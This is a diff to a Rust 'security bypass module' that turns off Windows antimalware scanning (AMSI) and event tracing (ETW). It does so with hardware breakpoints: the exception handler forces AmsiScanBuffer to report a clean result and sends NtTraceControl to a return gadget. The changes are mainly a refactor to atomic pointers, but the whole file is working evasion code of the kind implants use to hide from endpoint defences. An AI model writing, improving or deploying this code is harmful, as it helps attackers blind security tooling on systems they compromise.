@@ -1,6 +1,4 @@
 #![allow(non_snake_case, non_camel_case_types)]
-#![cfg(windows)]
-
 //! Security bypass module
 //!
 //! Implements AMSI and ETW bypass using hardware breakpoints.
@@ -33,11 +31,15 @@ use winapi::um::{
 
 use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
 
+use std::sync::atomic::{AtomicPtr, Ordering};
+
 const AMSI_RESULT_CLEAN: i32 = 0;
 const S_OK: i32 = 0;
 
-static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;
-static mut NT_TRACE_CONTROL_PTR: Option<*mut u8> = None;
+/// Pointeur vers AmsiScanBuffer (null si non résolu)
+static AMSI_SCAN_BUFFER_PTR: AtomicPtr<u8> = AtomicPtr::new(null_mut());
+/// Pointeur vers NtTraceControl (null si non résolu)
+static NT_TRACE_CONTROL_PTR: AtomicPtr<u8> = AtomicPtr::new(null_mut());
 
 #[repr(C)]
 struct CLIENT_ID {
@@ -145,31 +147,29 @@ unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS)
 
     if exception_code == EXCEPTION_SINGLE_STEP {
         // AMSI Bypass
-        if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
-            if exception_address == amsi_address as usize {
-                let return_address = get_return_address(context);
-                let scan_result_ptr = get_arg(context, 5) as *mut i32;
-                *scan_result_ptr = AMSI_RESULT_CLEAN;
+        let amsi_address = AMSI_SCAN_BUFFER_PTR.load(Ordering::Relaxed);
+        if !amsi_address.is_null() && exception_address == amsi_address as usize {
+            let return_address = get_return_address(context);
+            let scan_result_ptr = get_arg(context, 5) as *mut i32;
+            *scan_result_ptr = AMSI_RESULT_CLEAN;
 
-                set_ip(context, return_address);
-                adjust_stack_pointer(context, size_of::<*mut u8>() as i32);
-                set_result(context, S_OK as usize);
+            set_ip(context, return_address);
+            adjust_stack_pointer(context, size_of::<*mut u8>() as i32);
+            set_result(context, S_OK as usize);
 
-                clear_breakpoint(context, 0);
-                return EXCEPTION_CONTINUE_EXECUTION;
-            }
+            clear_breakpoint(context, 0);
+            return EXCEPTION_CONTINUE_EXECUTION;
         }
 
         // NtTraceControl Bypass
-        if let Some(nt_trace_address) = NT_TRACE_CONTROL_PTR {
-            if exception_address == nt_trace_address as usize {
-                if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
-                    context.Rip = new_rip as u64;
-                }
-
-                clear_breakpoint(context, 1);
-                return EXCEPTION_CONTINUE_EXECUTION;
+        let nt_trace_address = NT_TRACE_CONTROL_PTR.load(Ordering::Relaxed);
+        if !nt_trace_address.is_null() && exception_address == nt_trace_address as usize {
+            if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
+                context.Rip = new_rip as u64;
             }
+
+            clear_breakpoint(context, 1);
+            return EXCEPTION_CONTINUE_EXECUTION;
         }
     }
 
@@ -214,38 +214,36 @@ pub fn setup_bypass() -> Result<*mut c_void, String> {
     let mut thread_ctx: CONTEXT = unsafe { zeroed() };
     thread_ctx.ContextFlags = CONTEXT_ALL;
 
-    unsafe {
-        // Resolve AMSI_SCAN_BUFFER_PTR
-        if AMSI_SCAN_BUFFER_PTR.is_none() {
-            let module_name = CString::new("amsi.dll").unwrap();
-            let mut module_handle = GetModuleHandleA(module_name.as_ptr());
+    // Resolve AMSI_SCAN_BUFFER_PTR (only if not already resolved)
+    if AMSI_SCAN_BUFFER_PTR.load(Ordering::Relaxed).is_null() {
+        let module_name = CString::new("amsi.dll").unwrap();
+        let mut module_handle = unsafe { GetModuleHandleA(module_name.as_ptr()) };
 
-            if module_handle.is_null() {
-                module_handle = LoadLibraryA(module_name.as_ptr());
-            }
-
-            if !module_handle.is_null() {
-                let function_name = CString::new("AmsiScanBuffer").unwrap();
-                let amsi_scan_buffer = GetProcAddress(module_handle, function_name.as_ptr());
-
-                if !amsi_scan_buffer.is_null() {
-                    AMSI_SCAN_BUFFER_PTR = Some(amsi_scan_buffer as *mut u8);
-                }
-            }
+        if module_handle.is_null() {
+            module_handle = unsafe { LoadLibraryA(module_name.as_ptr()) };
         }
 
-        // Resolve NT_TRACE_CONTROL_PTR
-        if NT_TRACE_CONTROL_PTR.is_none() {
-            let ntdll_module_name = CString::new("ntdll.dll").unwrap();
-            let ntdll_module_handle = GetModuleHandleA(ntdll_module_name.as_ptr());
+        if !module_handle.is_null() {
+            let function_name = CString::new("AmsiScanBuffer").unwrap();
+            let amsi_scan_buffer = unsafe { GetProcAddress(module_handle, function_name.as_ptr()) };
 
-            let ntdll_function_name = CString::new("NtTraceControl").unwrap();
-            let ntdll_function_ptr =
-                GetProcAddress(ntdll_module_handle, ntdll_function_name.as_ptr());
-
-            if !ntdll_function_ptr.is_null() {
-                NT_TRACE_CONTROL_PTR = Some(ntdll_function_ptr as *mut u8);
+            if !amsi_scan_buffer.is_null() {
+                AMSI_SCAN_BUFFER_PTR.store(amsi_scan_buffer as *mut u8, Ordering::Relaxed);
             }
+        }
+    }
+
+    // Resolve NT_TRACE_CONTROL_PTR (only if not already resolved)
+    if NT_TRACE_CONTROL_PTR.load(Ordering::Relaxed).is_null() {
+        let ntdll_module_name = CString::new("ntdll.dll").unwrap();
+        let ntdll_module_handle = unsafe { GetModuleHandleA(ntdll_module_name.as_ptr()) };
+
+        let ntdll_function_name = CString::new("NtTraceControl").unwrap();
+        let ntdll_function_ptr =
+            unsafe { GetProcAddress(ntdll_module_handle, ntdll_function_name.as_ptr()) };
+
+        if !ntdll_function_ptr.is_null() {
+            NT_TRACE_CONTROL_PTR.store(ntdll_function_ptr as *mut u8, Ordering::Relaxed);
         }
     }
 
@@ -263,13 +261,13 @@ pub fn setup_bypass() -> Result<*mut c_void, String> {
             continue;
         }
 
-        unsafe {
-            if let Some(amsi_ptr) = AMSI_SCAN_BUFFER_PTR {
-                enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
-            }
-            if let Some(nt_trace_ptr) = NT_TRACE_CONTROL_PTR {
-                enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
-            }
+        let amsi_ptr = AMSI_SCAN_BUFFER_PTR.load(Ordering::Relaxed);
+        if !amsi_ptr.is_null() {
+            enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
+        }
+        let nt_trace_ptr = NT_TRACE_CONTROL_PTR.load(Ordering::Relaxed);
+        if !nt_trace_ptr.is_null() {
+            enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
         }
 
         if unsafe { NtSetContextThread(*thread_handle, &mut thread_ctx as *mut CONTEXT) } != 0 {
@@ -322,7 +320,7 @@ fn get_remote_thread_handle(process_id: u32) -> Result<Vec<HANDLE>, String> {
                 let thread_info = unsafe { &*thread_info_ptr };
 
                 let mut thread_handle: HANDLE = null_mut();
-                let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { zeroed() };
+                let object_attrs: OBJECT_ATTRIBUTES = unsafe { zeroed() };
                 let mut client_id: CLIENT_ID = unsafe { zeroed() };
                 client_id.UniqueThread = thread_info.ClientId.UniqueThread;
 
@@ -330,8 +328,8 @@ fn get_remote_thread_handle(process_id: u32) -> Result<Vec<HANDLE>, String> {
                     NtOpenThread(
                         &mut thread_handle,
                         THREAD_ALL_ACCESS,
-                        &mut object_attrs,
-                        &mut client_id,
+                        &object_attrs,
+                        &client_id,
                     )
                 };
 
